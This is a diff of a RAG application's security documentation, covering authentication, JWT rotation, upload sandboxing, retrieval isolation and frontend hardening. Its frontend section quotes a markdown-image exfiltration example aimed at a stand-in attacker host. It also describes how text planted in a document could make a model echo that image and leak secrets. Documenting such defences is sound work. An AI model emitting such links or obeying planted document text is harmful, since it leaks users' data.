@@ -1,4 +1,4 @@
-# Security (as implemented through Phase 2)
+# Security
 
 Requirements: `docs/spec/02-auth-security.md`. This file records what exists and its known limits. Update it every phase.
 
@@ -7,7 +7,7 @@ Requirements: `docs/spec/02-auth-security.md`. This file records what exists and
 - Hashing runs in worker threads behind a semaphore (`max_concurrent_hashes`, default 4) so it neither blocks the event loop nor lets concurrent requests exhaust memory.
 - Rehash on successful login when parameters change (tested).
 - Unknown accounts still burn one Argon2 verification (dummy hash) to equalize timing.
-- Policy: 12-128 characters, not blank, at least 5 distinct characters, not in a small common list, must not contain the email local part (when 4+ chars). This is a deliberately modest policy; there is no breached-password check.
+- Policy: 12-128 characters, not blank, at least 5 distinct characters, must not contain the email local part (when 4+ chars). The offline common/breached-password corpus also rejects known passwords and simple decorated variants (its coverage is limited; see KI-011).
 
 ## Email and uniqueness
 - One shared `normalize_email` (syntax check without DNS, Unicode NFKC, lowercase). `users.email_normalized` has a PostgreSQL UNIQUE constraint and a CHECK that it is lowercase. The constraint is the final authority: `IntegrityError` becomes 409 `EMAIL_ALREADY_REGISTERED`. Proven by a 24-way concurrent registration test and by a test that disables the application pre-check.
@@ -17,7 +17,7 @@ Requirements: `docs/spec/02-auth-security.md`. This file records what exists and
 - Access token: HS256 JWT, 15 min. Validated: signature with algorithm list `["HS256"]` only, exp, iat (not in the future), iss, aud, required claims (`exp iat iss aud sub type sid jti`), `type == "access"`. Tested against alg=none, other HMAC algorithms, wrong secret/issuer/audience/type, missing claims.
 - The access token carries `sid` (session id = refresh-token family). Every authenticated request checks in PostgreSQL that the user is active and the session still has a live refresh token. So logout, session revocation and reuse detection take effect immediately, not after the 15 minutes.
 - Refresh token: 384-bit random opaque string, only its SHA-256 is stored. Rotation on every use. Replaying an already-used token revokes the whole family. Two concurrent refreshes of the same token serialize on a row lock; exactly one wins and the loser triggers family revocation (strict by design, so a legitimate client that double-submits has to log in again).
-- JWT signing secret comes from `JWT_SECRET` (min 32 chars, enforced). There is no key rotation mechanism yet (single secret).
+- JWT signing secret comes from `JWT_SECRET` (min 32 chars, enforced). Signing uses the active `kid`; configured retired keys remain accepted for verification during rotation (ADR-010).
 
 ## Rate limiting and brute force
 - Redis fixed-window counters (atomic Lua INCR+EXPIRE, always with a TTL). Keys are SHA-256 digests; no emails or IPs in Redis in clear text.
@@ -34,11 +34,11 @@ Requirements: `docs/spec/02-auth-security.md`. This file records what exists and
 
 ## Isolation
 - Identity is derived only from the validated token. `require_owner` returns 404 (not 403) for another user's or a missing resource; tested on login sessions (list/revoke) including the attacker case and a mutation check (removing the ownership check makes the test fail).
-- Not yet covered (arrives with the resources): documents, vectors, conversations, checkpoints, memories, jobs.
+- Documents, vectors, conversations, checkpoints, memories and jobs also have scoped authorization; see the resource-specific sections below.
 
 ## Account security (added after Phase 2)
 - Password change (needs the current password; wrong-password attempts rate limited 5/15 min; other sessions revoked) and password reset by emailed single-use token (1 h; all sessions revoked; token survives a rejected weak password; concurrent use succeeds once). `forgot` never reveals whether an account exists.
-- Email verification by single-use token (24 h). `email_verified` is exposed on the user; nothing is gated on it yet.
+- Email verification by single-use token (24 h). `REQUIRE_VERIFIED_EMAIL` gates document/ingestion operations and is required in production.
 - TOTP MFA with encrypted seed, replay protection, recovery codes and a separate short-lived challenge token. See ADR-010.
 - JWT signing key rotation with `kid` (ADR-010). Key storage is environment variables only (no KMS/vault).
 - Limits: the email file backend writes tokens to disk (dev/test only); SMTP credentials live in env; recovery codes carry ~50 bits and rely on the 5-attempt rate limit; TOTP seeds are only as safe as `MFA_ENCRYPTION_KEY` (rotating it invalidates enrolled seeds; no re-encryption tool yet).
@@ -48,11 +48,12 @@ Requirements: `docs/spec/02-auth-security.md`. This file records what exists and
 - Storage keys are generated (`<user>/<document>/original.pdf`); user filenames are only a sanitized display name (path components and control characters removed, 255 chars). Local storage also verifies the resolved path stays inside the root.
 - Integrity: the SHA-256 computed on upload is compared with the bytes actually stored, and again by the worker before extraction (`STORAGE_INTEGRITY`).
 - Isolation: every document/job query filters by the authenticated user; other users' ids behave like missing ids (404); a re-upload by another user is a normal 202 so existence is never revealed; workers re-check that job and document belong to the same user; every Qdrant maintenance filter carries user_id and document_id; points carry `user_id` as a tenant-indexed field for Phase 4 query filters.
-- Limits (configurable): PDF size 25 MiB, 300 pages, upload rate 30/hour per user, request body cap = PDF limit + 1 MiB on the upload route only, OCR pages and DPI.
-- Not covered: malware scanning, sandboxing the PDF parser in a separate process/container (pypdf runs in-process in a thread; a hostile PDF can still burn CPU until the timeout/worker time limit), encryption of stored objects at rest.
+- Limits (configurable): PDF size 25 MiB, 200 pages, upload rate 30/hour per user, request body cap = maximum supported format limit + 1 MiB on the upload route only, OCR pages and DPI.
+- Parsing runs in resource-limited child processes (details below). Not covered: malware scanning and application-managed encryption of stored objects at rest; provider encryption must be reviewed for deployment.
 
 ## Not implemented yet
-Account deletion, breached-password check, audit log table, malware scanning of uploads, prompt-injection defenses (Phases 3-6).
+Audit log table and malware scanning of uploads. Account deletion, offline breached-password checks
+and prompt-injection defenses are implemented as described below.
 
 ## Added 2026-11-08 (parsing sandbox, formats, account lifecycle)
 - Parsing sandbox (ADR-016): timeouts, memory cap, no process spawning (Windows), scrubbed environment. Tested on Windows against decompression bombs, self-referencing page trees, XXE, entity bombs and zip bombs. Linux limits are implemented but unverified (KI-020). No malware scanning.
@@ -61,7 +62,7 @@ Account deletion, breached-password check, audit log table, malware scanning of 
 - Breached-password check: offline list; rejects known passwords and trivially decorated variants.
 - `REQUIRE_VERIFIED_EMAIL`: document and ingestion routes require a verified email; production config refuses to start without it.
 - Logging: the console renderer uses plain tracebacks (rich tracebacks print local variables, which can include secrets); regression test.
-- JWT key rotation (`kid`) exists, so the earlier "no key rotation" note above is out of date.
+- JWT key rotation (`kid`) is implemented; active and retired verification keys are configured separately.
 - Still open: admin-forced MFA (KI-011), fixed-window rate limits (KI-012).
 
 ## Retrieval authorization (Phase 4)
@@ -69,7 +70,7 @@ Account deletion, breached-password check, audit log table, malware scanning of 
 - Tombstoned documents disappear from search instantly, before their vectors are purged. Documents that are being (re)processed are not searchable.
 - Unknown, foreign and unreadable document ids are indistinguishable (empty result, same status).
 - Search is rate limited per user (`RL_SEARCH_LIMIT` per `RL_SEARCH_WINDOW_S`), fails closed if Redis is down, and bounded: query length, scope size, top-k, per-stage timeouts.
-- Retrieved text is untrusted input for the LLM (prompt-injection handling arrives with generation, Phase 6); search results never contain storage keys or user ids.
+- Retrieved text is untrusted input for the LLM (prompt-injection handling is described under Phase 6); search results never contain storage keys or user ids.
 - Known limit: the Qdrant filter lists the readable document ids; users with thousands of documents produce large filters (bounded by `RETRIEVAL_MAX_SCOPE_DOCUMENTS` only when the caller narrows). Revisit with a status payload field if this becomes a bottleneck.
 
 ## Sessions, chat state and memory (Phase 5)
@@ -98,7 +99,7 @@ Account deletion, breached-password check, audit log table, malware scanning of 
 - Forged client state (another user's conversation id or profile put into the session state) changes nothing: ids are validated by the backend (404) and the displayed profile is not used for any request. Tested at UI and API level.
 - Backend error bodies are never shown raw: non-JSON or unknown responses are classified as "unexpected response"; known codes get fixed wording plus the request id as a support reference.
 - Feedback: owner-only, assistant messages of live conversations only, identical 404 otherwise, per-user rate limit, comment capped and trimmed, stored as plain text in PostgreSQL (comments are user content: excluded from traces like every other user text).
-- Limits: no CSRF concern (no cookies, bearer tokens only), but Streamlit itself and the API must be served over HTTPS in deployment; no content-security policy is set by Streamlit's default server.
+- The API authenticates with bearer tokens rather than browser credential cookies. Streamlit's own browser security protections still apply; both servers must use HTTPS in deployment. Streamlit's default server does not add an application content-security policy.
 
 ## Hardening added in Phase 10
 - Response headers on every response (including 401/404/405/413/422): nosniff, no-referrer, frame denial, `no-store`, a deny-all CSP (except the dev-only `/docs`), HSTS in production only. Tested for each response kind and with mutations.
@@ -109,3 +110,15 @@ Account deletion, breached-password check, audit log table, malware scanning of 
 ## Frontend hardening (2026-11-13)
 - **Markdown images are never loaded.** Model answers and document excerpts are untrusted. Streamlit escapes HTML, but a markdown image (`![x](https://attacker/?q=<secret>)`) placed in a document could make a compliant model echo it and the browser fetch it as soon as the answer is shown, leaking data. All answer, excerpt and message text goes through `frontend.format.safe_markdown`, which renders images (markdown and `<img>`) as text. Tested.
 - **"Keep me signed in" (opt-in, KI-041 fixed).** API tokens stay on the Streamlit server; the browser gets only a random handle in a `SameSite=Strict` cookie (`Secure` over HTTPS) whose hash maps to the server-side session. Idle expiry 12 h, absolute 7 days, server-side revocation on sign-out or token expiry, a server restart forgets all handles. The cookie is set by script, so it is readable by script on this origin; this is acceptable only because no user or model text is rendered as HTML (see above). Off by default.
+
+## Hosted deployment preparation (2026-11-14)
+- Production PostgreSQL connections require verified TLS. API, migrations, worker and checkpointer
+  use the same configured CA and database schema. Supabase uses a private, unexposed `rag` schema
+  with a dedicated non-superuser role; public Data APIs must not bypass FastAPI authorization.
+- Original uploads use a private S3 bucket on ephemeral backend hosts; backend S3/database credentials
+  never go to Streamlit or browsers. Actual Streamlit secrets files and local runtime/credential
+  directories are excluded from publication/builds. Required application source/data remain included.
+- Windows sandbox timeouts terminate via the retained process handle; external taskkill failures
+  no longer turn a timeout into an unbounded wait. Linux container limits remain unverified.
+- See HOSTING.md for configuration and AUDIT_REPORT.md for findings, deployment limits and pending
+  cloud verification. No cloud deployment or production security certification is claimed.
